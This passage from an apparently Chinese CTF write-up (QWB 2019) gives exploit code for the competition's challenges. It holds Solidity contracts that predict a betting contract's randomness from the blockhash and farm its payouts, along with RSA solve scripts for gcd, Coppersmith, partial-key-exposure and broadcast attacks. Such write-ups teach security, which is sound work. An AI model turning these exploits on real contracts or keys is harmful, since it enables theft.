<figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">contract midContract &#123;</span><br><span class="line">    babybet <span class="keyword">target</span> = babybet(<span class="number">0</span>x5d1BeEFD4dE611caFf204e1A318039324575599A);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span></span> process() <span class="keyword">public</span> &#123;</span><br><span class="line">        <span class="keyword">target</span>.profit();</span><br><span class="line">        bytes32 guess = block.blockhash(block.<span class="keyword">number</span> - <span class="number">0</span>x01);</span><br><span class="line">        uint guess1 = uint(guess) % <span class="number">0</span>x03;</span><br><span class="line">        <span class="keyword">target</span>.bet(guess1);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span></span> <span class="built_in">transfer</span>(address a, uint b) <span class="keyword">public</span>&#123;</span><br><span class="line">        // <span class="keyword">target</span>.func_048F(a,b);</span><br><span class="line">        bytes4 method = <span class="number">0</span>xf0d25268;</span><br><span class="line">        <span class="keyword">target</span>.<span class="keyword">call</span>(method,a,b);</span><br><span class="line">        selfdestruct();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract hack &#123;</span><br><span class="line">    // babybet <span class="keyword">target</span>; = babybet(<span class="number">0</span>x5d1BeEFD4dE611caFf204e1A318039324575599A);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span></span> ffff() <span class="keyword">public</span> &#123;</span><br><span class="line">     for(<span class="built_in">int</span> i=<span class="number">0</span>;i&lt;=<span class="number">20</span>;i++)&#123;</span><br><span class="line">            midContract mid = new midContract();</span><br><span class="line">            mid.process();</span><br><span class="line">            mid.<span class="built_in">transfer</span>(<span class="string">"0x9b9a30b7df47b9dbe0ec7d4bd52aaae4465f2ebe"</span>,<span class="number">1000</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>每次生成新合约，循环20次，所以此合约执行50次即可。记得将gas limit调大。<br>预测十分简单，即使用一下语句即可<br><img src="/2019/05/28/QWB2019-writeup/15589284998213.jpg" alt=""></p>
<p><img src="/2019/05/28/QWB2019-writeup/788BCCDA110BDF3D121071BE06087E65.jpg" alt=""></p>
<p><img src="/2019/05/28/QWB2019-writeup/E49C45F46049C891DFAD6EEE3662C1C9.jpg" alt=""></p>
<p>调用后拿到flag<br><img src="/2019/05/28/QWB2019-writeup/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202019-05-27%20%E4%B8%8A%E5%8D%8811.41.53.png" alt=""></p>
<h2 id="强网先锋-辅助"><a href="#强网先锋-辅助" class="headerlink" title="强网先锋_辅助"></a>强网先锋_辅助</h2><p>公因数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">n1=<span class="number">14967030059975114950295399874185047053736587880127990542035765201425779342430662517765063258784685868107066789475747180244711352646469776732938544641583842313791872986357504462184924075227433498631423289187988351475666785190854210389587594975456064984611990461126684301086241532915267311675164190213474245311019623654865937851653532870965423474555348239858021551589650169602439423841160698793338115204238140085738680883313433574060243600028500600824624358473403059597593891412179399165813622512901263380299561019624741488779367019389775786547292065352885007224239581776975892385364446446185642939137287519945974807727</span></span><br><span class="line">n2=<span class="number">14624662628725820618622370803948630854094687814338334827462870357582795291844925274690253604919535785934208081825425541536057550227048399837243392490762167733083030368221240764693694321150104306044125934201699430146970466657410999261630825931178731857267599750324918610790098952520113593130245010530961350592735239454337631927669542026935873535964487595433984902529960726655481696404006628917922241666148082741874033756970724357470539589848548704573091633917869387239324447730587545472564561496724882799495186768858324490838169123077051890332313671220385830444331578674338014080959653201802476516237464651809255679979</span></span><br><span class="line">c1=<span class="number">2482083893746618248544426737023750400124543452082436334398504986023501710639402060949106693279462896968839029712099336235976221571564642900240827774719199533124053953157919850838214021934907480633441577316263853011232518392904983028052155862154264401108124968404098823946691811798952747194237290581323868666637357604693015079007555594974245559555518819140844020498487432684946922741232053249894575417796067090655122702306134848220257943297645461477488086804856018323986796999103385565540496534422406390355987976815450744535949785073009043007159496929187184338592859040917546122343981520508220332785862546608841127597</span></span><br><span class="line">c2=<span class="number">3829060039572042737496679186881067950328956133163629908872348108160129550437697677150599483923925798224328175594483217938833520220087230303470138525970468915511111320396185482564783975435346354440035776909781158407636044986403819840648379609630039348895415045723208843631191252142600667607807479954194447237061080618370787672720344741413537975922184859333432197766580150534457001196765621678659952108010596273244230812327182786329760844037149719587269632133595149294067490955644893402708720284179715002149224068928828656515326446881791228638008572889331511945042911372915003805505412099102954073299010951896955362470</span></span><br><span class="line">e1=<span class="number">65537</span></span><br><span class="line">e2=<span class="number">65537</span></span><br><span class="line"></span><br><span class="line">q=gmpy2.gcd(n1,n2)</span><br><span class="line">p1=n1//q</span><br><span class="line">p2=n2//q</span><br><span class="line"></span><br><span class="line">d1=gmpy2.invert(e1,(p1<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line">d2=gmpy2.invert(e2,(p2<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> d1&lt;<span class="number">0</span>:</span><br><span class="line">    d1+=(p1<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line"><span class="keyword">while</span> d2&lt;<span class="number">0</span>:</span><br><span class="line">    d2+=(p2<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">m2=pow(c2,d2,n2)</span><br><span class="line">m1=pow(c1,d1,n1)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> libnum.n2s(m2)</span><br><span class="line"><span class="keyword">print</span> libnum.n2s(m1)</span><br></pre></td></tr></table></figure>

<h2 id="copperstudy"><a href="#copperstudy" class="headerlink" title="copperstudy"></a>copperstudy</h2><p>RSA大礼包，一共六关</p>
<h3 id="challenge1"><a href="#challenge1" class="headerlink" title="challenge1"></a>challenge1</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[+]Generating challenge <span class="number">1</span></span><br><span class="line"></span><br><span class="line">[+]n=<span class="number">0xa1888c641a05aeb81b3d1686317a86f104791fe1d570a5b11209f45d09ea401d255a70744e7a2d39520e359c23a9f1209ee47f496dbd279e62ee1648b3a277ced8825298274322e0a7a86deea282676310a73b6bb946fc924c34ac6c8784ff559bf9a004c03fb167ef54aaea90ce587f2f3074b40d7f632022ec8fb12e659953L</span></span><br><span class="line">[+]e=<span class="number">3</span></span><br><span class="line">[+]m=random.getrandbits(<span class="number">512</span>)</span><br><span class="line">[+]c=pow(m,e,n)=<span class="number">0x93145ece45f416a11e5e9475518f165365456183c361500c2f78aff263028c90f20b7d97205f54e21f3bcc8a556b457889fde3719d0a0f9c9646f3f0d0a1e4bee0f259f023168fe8cc0511848c1635022fcc20b6088084585e2f8055a9d1b1d6bdb228087900bf7c6d42298f8e45c451562c816e2303990834c94e580bf0cbd1L</span></span><br><span class="line">[+]((m&gt;&gt;<span class="number">72</span>)&lt;&lt;<span class="number">72</span>)=<span class="number">0x9e67d3a220a3dcf6fc4742052621f543b8c78d5d9813e69272e65ac676672446e5c88887e8bfdfc92ec87ec74c16350e6b539e3bd910b000000000000000000L</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 70841b8fe11fd1872e</span></span><br><span class="line"><span class="comment"># 9e67d3a220a3dcf6fc4742052621f543b8c78d5d9813e69272e65ac676672446e5c88887e8bfdfc92ec87ec74c16350e6b539e3bd910b70841b8fe11fd1872eL</span></span><br></pre></td></tr></table></figure>
<p>Lattice based attacks<br>已知明文高位的攻击<br>直接上脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">e = <span class="number">0x3</span></span><br><span class="line">b = <span class="number">0x9e67d3a220a3dcf6fc4742052621f543b8c78d5d9813e69272e65ac676672446e5c88887e8bfdfc92ec87ec74c16350e6b539e3bd910b000000000000000000L</span></span><br><span class="line">n = <span class="number">0xa1888c641a05aeb81b3d1686317a86f104791fe1d570a5b11209f45d09ea401d255a70744e7a2d39520e359c23a9f1209ee47f496dbd279e62ee1648b3a277ced8825298274322e0a7a86deea282676310a73b6bb946fc924c34ac6c8784ff559bf9a004c03fb167ef54aaea90ce587f2f3074b40d7f632022ec8fb12e659953L</span></span><br><span class="line">c=<span class="number">0x93145ece45f416a11e5e9475518f165365456183c361500c2f78aff263028c90f20b7d97205f54e21f3bcc8a556b457889fde3719d0a0f9c9646f3f0d0a1e4bee0f259f023168fe8cc0511848c1635022fcc20b6088084585e2f8055a9d1b1d6bdb228087900bf7c6d42298f8e45c451562c816e2303990834c94e580bf0cbd1L</span></span><br><span class="line">kbits=<span class="number">72</span></span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = (x + b)^e-c</span><br><span class="line">x0 = f.small_roots(X=<span class="number">2</span>^kbits, beta=<span class="number">1</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"x: %s"</span> %hex(int(x0))</span><br></pre></td></tr></table></figure>

<h3 id="challenge2"><a href="#challenge2" class="headerlink" title="challenge2"></a>challenge2</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[+]Generating challenge <span class="number">2</span></span><br><span class="line">[+]n=<span class="number">0x241ac918f708fff645d3d6e24315e5bb045c02e788c2b7f74b2b83484ce9c0285b6c54d99e2a601a386237d666db2805175e7cc86a733a97aeaab63486133103e30c1dca09741819026bd3ea8d08746d1d38df63c025c1793bdc7e38d194a30b492aadf9e31a6c1240a65db49e061b48f1f2ae949ac9e7e0992ed24f9c01578dL</span></span><br><span class="line">[+]e=<span class="number">65537</span></span><br><span class="line">[+]m=random.getrandbits(<span class="number">512</span>)</span><br><span class="line">[+]c=pow(m,e,n)=<span class="number">0x1922e7151c779d6bb554cba6a05858415e74739c36df0bcf169e49ef0e566a4353c51a306036970005f2321d1d104f91a673f40944e830619ed683d8f84eaf26e7a93c4abe1dbd7ca3babf3f4959def0e3d87f7818d54633a790fc74e9fed3c5b5456c21e3f425240f6217b0b14516cb59aa0ce74b83ca17d8cc4a0fbc829fb8L</span></span><br><span class="line">[+]((p&gt;&gt;<span class="number">128</span>)&lt;&lt;<span class="number">128</span>)=<span class="number">0x2c1e75652df018588875c7ab60472abf26a234bc1bfc1b685888fb5ded29ab5b93f5105c1e9b46912368e626777a873200000000000000000000000000000000L</span></span><br></pre></td></tr></table></figure>
<p>p高位已知，低位未知.<br>解题脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">0x241ac918f708fff645d3d6e24315e5bb045c02e788c2b7f74b2b83484ce9c0285b6c54d99e2a601a386237d666db2805175e7cc86a733a97aeaab63486133103e30c1dca09741819026bd3ea8d08746d1d38df63c025c1793bdc7e38d194a30b492aadf9e31a6c1240a65db49e061b48f1f2ae949ac9e7e0992ed24f9c01578dL</span></span><br><span class="line">p_fake = <span class="number">0x2c1e75652df018588875c7ab60472abf26a234bc1bfc1b685888fb5ded29ab5b93f5105c1e9b46912368e626777a873200000000000000000000000000000000L</span></span><br><span class="line"> </span><br><span class="line">pbits = <span class="number">1024</span></span><br><span class="line">kbits = <span class="number">130</span></span><br><span class="line">pbar = p_fake &amp; (<span class="number">2</span>^pbits<span class="number">-2</span>^kbits)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"upper %d bits (of %d bits) is given"</span> % (pbits-kbits, pbits)</span><br><span class="line"> </span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = x + pbar</span><br><span class="line"> </span><br><span class="line">x0 = f.small_roots(X=<span class="number">2</span>^kbits, beta=<span class="number">0.4</span>)[<span class="number">0</span>]  <span class="comment"># find root &lt; 2^kbits with factor &gt;= n^0.3</span></span><br><span class="line"><span class="keyword">print</span> hex(int(x0 + pbar))</span><br><span class="line"></span><br><span class="line"><span class="comment"># output :  0x2c1e75652df018588875c7ab60472abf26a234bc1bfc1b685888fb5ded29ab5b93f5105c1e9b46912368e626777a87321efe89ec89bdf3e4d9da9a45df22a787L</span></span><br></pre></td></tr></table></figure>
<h3 id="challenge3"><a href="#challenge3" class="headerlink" title="challenge3"></a>challenge3</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[+]Generating challenge <span class="number">3</span></span><br><span class="line"></span><br><span class="line">[+]n=<span class="number">0x51fb3416aa0d71a430157d7c9853602a758e15462e7c08827b04cd3220c427bbb8199ed4f5393dae43f013b68732a685defc17497f0912c886fa780dfacdfbb1461197d95a92a7a74ade874127a61411e14a901382ed3fb9d62c040c0dbaa374b5a4df06481a26da3fca271429ff10a4fc973b1c82553e3c1dd4f2f37dc24b3bL</span></span><br><span class="line"></span><br><span class="line">[+]e=<span class="number">3</span></span><br><span class="line">[+]m=random.getrandbits(<span class="number">512</span>)</span><br><span class="line">[+]c=pow(m,e,n)=<span class="number">0x3d7e16fd8b0b1afdb4e12594c3d8590f1175800ef07bb275d7a8ad983d0d5d5fd5c6f81efa40f5d10c48bb200f805e679d633ee584748e5feef003e0921dea736ba91eef72f3d591d3a54cd59fd36f61140fdd3fb2e2c028b684e50cbeae4a1f386f6ab35359d46a29996c0f7d9a4a189f1096150496746f064c3cc41cf111b0L</span></span><br><span class="line">[+]d=invmod(e,(p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line">[+]d&amp;((<span class="number">1</span>&lt;&lt;<span class="number">512</span>)<span class="number">-1</span>)=<span class="number">0x17c4b18f1290b6a0886eaa7bf426485a3994c5b71186fe84d5138e18de7e060db57f9580381a917fdfd171bfd159825a7d1e2800e2774f5e4449d17e6723749bL</span></span><br><span class="line">[-]long_to_bytes(m).encode(<span class="string">'hex'</span>)=</span><br><span class="line">d = <span class="number">0x36a7780f1c08f66d7563a8fdbae2401c4e5eb8d97452b056fcadde216b2d6fd27abbbf38a37b7e742d4ab7cf04cc6f03e9fd64dbaa060c85af51a55ea733fd2017c4b18f1290b6a0886eaa7bf426485a3994c5b71186fe84d5138e18de7e060db57f9580381a917fdfd171bfd159825a7d1e2800e2774f5e4449d17e6723749bL</span></span><br></pre></td></tr></table></figure>
<p>已知低位的密钥和N。Partial Key Exposure Attack(部分私钥暴露攻击)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">partial_p</span><span class="params">(p0, kbits, n)</span>:</span></span><br><span class="line">    PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    nbits = n.nbits()</span><br><span class="line">    f = <span class="number">2</span>^kbits*x + p0</span><br><span class="line">    f = f.monic()</span><br><span class="line">    roots = f.small_roots(X=<span class="number">2</span>^(nbits//<span class="number">2</span>-kbits), beta=<span class="number">0.3</span>)  <span class="comment"># find root &lt; 2^(nbits//2-kbits) with factor &gt;= n^0.3</span></span><br><span class="line">    <span class="keyword">if</span> roots:</span><br><span class="line">        x0 = roots[<span class="number">0</span>]</span><br><span class="line">        p = gcd(<span class="number">2</span>^kbits*x0 + p0, n)</span><br><span class="line">        <span class="keyword">return</span> ZZ(p)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_p</span><span class="params">(d0, kbits, e, n)</span>:</span></span><br><span class="line">    X = var(<span class="string">'X'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> xrange(<span class="number">1</span>, e+<span class="number">1</span>):</span><br><span class="line">        results = solve_mod([e*d0*X - k*X*(n-X+<span class="number">1</span>) + k*n == X], <span class="number">2</span>^kbits)</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> results:</span><br><span class="line">            p0 = ZZ(x[<span class="number">0</span>])</span><br><span class="line">            p = partial_p(p0, kbits, n)</span><br><span class="line">            <span class="keyword">if</span> p:</span><br><span class="line">                <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment"># n = 0x51fb3416aa0d71a430157d7c9853602a758e15462e7c08827b04cd3220c427bbb8199ed4f5393dae43f013b68732a685defc17497f0912c886fa780dfacdfbb1461197d95a92a7a74ade874127a61411e14a901382ed3fb9d62c040c0dbaa374b5a4df06481a26da3fca271429ff10a4fc973b1c82553e3c1dd4f2f37dc24b3bL</span></span><br><span class="line">    e = <span class="number">3</span></span><br><span class="line">    <span class="comment"># d = 0x17c4b18f1290b6a0886eaa7bf426485a3994c5b71186fe84d5138e18de7e060db57f9580381a917fdfd171bfd159825a7d1e2800e2774f5e4449d17e6723749bL</span></span><br><span class="line"></span><br><span class="line">    n = <span class="number">57569201048993475052349187244752169754165154575782760003851777813767048953051839288528137121670999884309849815765999616346303792471518639080697166767644957046582385785721102370288806038187956032505761532789716009522131450217010629338000241936036185205038814391205848232364006349213836317806903032515194407739</span></span><br><span class="line">    nbits = n.nbits()</span><br><span class="line">    kbits = floor(nbits*<span class="number">0.5</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"kbits : "</span>, kbits </span><br><span class="line">    d0 = <span class="number">1244848677959253796774387650148978357579294769878147704641867595620534030329181934099194560059806799908134954814673426128260540575360296026444649631806619</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"lower %d bits (of %d bits) is given"</span> % (kbits, nbits)</span><br><span class="line"></span><br><span class="line">    p = find_p(d0, kbits, e, n)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"found p: %d"</span> % p</span><br><span class="line">    q = n//p</span><br><span class="line">    <span class="comment"># print d</span></span><br><span class="line">    <span class="keyword">print</span> inverse_mod(e, (p<span class="number">-1</span>))</span><br></pre></td></tr></table></figure>
<h3 id="challenge4"><a href="#challenge4" class="headerlink" title="challenge4"></a>challenge4</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[+]Generating challenge <span class="number">4</span></span><br><span class="line">[+]e=<span class="number">3</span></span><br><span class="line">[+]m=random.getrandbits(<span class="number">512</span>)</span><br><span class="line"></span><br><span class="line">[+]n1=<span class="number">0x4b25bd834da788533ebef06f552bc8230024d1a571226770bd93bad3b202af4de7f680252a61cc423b3143db075196d6c282e71e84a3f3fe582c69c822389ddf76a86f9169334868119a884b8185c4ee559a3540141c785f2a9e1d59e3c828b26fc785ae4b578da073a39000fbaca6f30807a6110079dc64693dd1089835ea0bL</span></span><br><span class="line"></span><br><span class="line">[+]c1=pow(m,e,n1)=<span class="number">0x5e6a4b86018060a6c38952cfd450695ca90444c51d4e0de4690dbadd5000f7bb62e752bbd70c27f342792cc669f0d650b0c8e31b233963c32ebc2297d5aae650a8be7ba5a49319cc010ea8333de09fb4ae9e25af4cce79afcaad80263fbb02329dadb49bfb5f87791c9d29e52103f0153a200f7a11b00086c3c7ae6bbc30269L</span></span><br><span class="line"></span><br><span class="line">[+]n2=<span class="number">0x2388ddafc70ba72e181857376f3b23bf6b95c5f721a05e5e499caed0ee81a40031223718156752eef2c7535d8d8d0224126975492f8f002ca98d923ba3f05bff14eac24fb35dd50683cadc3ae0fa55ac368ebe5eb4ecfeb48ada4d785d7c64524783ef50a7c599a27b6a2afa9e1c1a41c6aba40dfd316eef4dc6718eba2af1c5L</span></span><br><span class="line"></span><br><span class="line">[+]c2=pow(m,e,n2)=<span class="number">0x71c907c67faf78314ff0332a7fe1d23fd6c9d788425affd54b851c805327fe363c340b047b555f356b1d8b6a930cb22a2e2eb3eb492ab4b307bc782c34fe1dfd032a2d838a80fbf8f6990baa4c712bc9f3bcae964806d418301cd25bc35c0d07a3fc24b25ecc527d3bfafaa5c6ffcf171446238925a76039a2aadc557efb871L</span></span><br><span class="line"></span><br><span class="line">[+]n3=<span class="number">0x33e9cbd05b84dc1e5d314656c937c2225351bd0573a5d2d8db357db8afb65be91b0362f8c1b9bbaab51c23decfff77cf8160e260c3374c2fd5b69d1a64cdddb5bd6e37e049e4a657d4a239177b9ec23a873ae272861567b8ea000880d0ba8e7f0449de97f955a78e78e7c8a3becbf3adb6825326786d98ecc30d34be67b5be69L</span></span><br><span class="line"></span><br><span class="line">[+]c3=pow(m,e,n3)=<span class="number">0x37bf32f9bfd3afc668b2fb4f48ab3e888bbc204eda2dd05af8dc08974698aa7808cb8623ee16cb17ccc9e27de90d283569390f1ea155a645e46a47f4a1c147d139b631219a94ea3fcac314515a112c7e673ddf594482eec00c0ec8c46dbf4bc4532c19a5dcdbc0a1c8882937b5546653e73c047473df8aa350d876c7a62f60fL</span></span><br><span class="line">[-]long_to_bytes(m).encode(<span class="string">'hex'</span>)</span><br></pre></td></tr></table></figure>
<p>广播攻击</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">broadcast</span><span class="params">(n1, n2 ,n3, c1, c2, c3)</span>:</span></span><br><span class="line">    n = [n1, n2, n3]</span><br><span class="line">    C = [c1, c2, c3]</span><br><span class="line">    N = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> n:</span><br><span class="line">        N *= i</span><br><span class="line"></span><br><span class="line">    Ni = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> n:</span><br><span class="line">        Ni.append(N / i)</span><br><span class="line"></span><br><span class="line">    T = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">3</span>):</span><br><span class="line">        T.append(long(gmpy2.invert(Ni[i], n[i])))</span><br><span class="line"></span><br><span class="line">    X = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">3</span>):</span><br><span class="line">        X += C[i] * Ni[i] * T[i]</span><br><span class="line"></span><br><span class="line">    m3 = X % N</span><br><span class="line">    m = gmpy2.iroot(m3, <span class="number">3</span>)</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line">n1=<span class="number">0x4b25bd834da788533ebef06f552bc8230024d1a571226770bd93bad3b202af4de7f680252a61cc423b3143db075196d6c282e71e84a3f3fe582c69c822389ddf76a86f9169334868119a884b8185c4ee559a3540141c785f2a9e1d59e3c828b26fc785ae4b578da073a39000fbaca6f30807a6110079dc64693dd1089835ea0bL</span></span><br><span class="line">c1=<span class="number">0x5e6a4b86018060a6c38952cfd450695ca90444c51d4e0de4690dbadd5000f7bb62e752bbd70c27f342792cc669f0d650b0c8e31b233963c32ebc2297d5aae650a8be7ba5a49319cc010ea8333de09fb4ae9e25af4cce79afcaad80263fbb02329dadb49bfb5f87791c9d29e52103f0153a200f7a11b00086c3c7ae6bbc30269L</span></span><br><span class="line">n2=<span class="number">0x2388ddafc70ba72e181857376f3b23bf6b95c5f721a05e5e499caed0ee81a40031223718156752eef2c7535d8d8d0224126975492f8f002ca98d923ba3f05bff14eac24fb35dd50683cadc3ae0fa55ac368ebe5eb4ecfeb48ada4d785d7c64524783ef50a7c599a27b6a2afa9e1c1a41c6aba40dfd316eef4dc6718eba2af1c5L</span></span><br><span class="line">c2=<span class="number">0x71c907c67faf78314ff0332a7fe1d23fd6c9d788425affd54b851c805327fe363c340b047b555f356b1d8b6a930cb22a2e2eb3eb492ab4b307bc782c34fe1dfd032a2d838a80fbf8f6990baa4c712bc9f3bcae964806d418301cd25bc35c0d07a3fc24b25ecc527d3bfafaa5c6ffcf171446238925a76039a2aadc557efb871L</span></span><br><span class="line">n3=<span class="number">0x33e9cbd05b84dc1e5d314656c937c2225351bd0573a5d2d8db357db8afb65be91b0362f8c1b9bbaab51c23decfff77cf8160e260c3374c2fd5b69d1a64cdddb5bd6e37e049e4a657d4a239177b9ec23a873ae272861567b8ea000880d0ba8e7f0449de97f955a78e78e7c8a3becbf3adb6825326786d98ecc30d34be67b5be69L</span></span><br><span class="line">c3=<span class="number">0x37bf32f9bfd3afc668b2fb4f48ab3e888bbc204eda2dd05af8dc08974698aa7808cb8623ee16cb17ccc9e27de90d283569390f1ea155a645e46a47f4a1c147d139b631219a94ea3fcac314515a112c7e673ddf594482eec00c0ec8c46dbf4bc4532c19a5dcdbc0a1c8882937b5546653e73c047473df8aa350d876c7a62f60fL</span></span><br><span class="line"></span><br><span class="line">m = broadcast(n1,n2,n3,c1,c2,c3)</span><br><span class="line"><span class="keyword">print</span> m</span><br></pre></td></tr></table></figure>
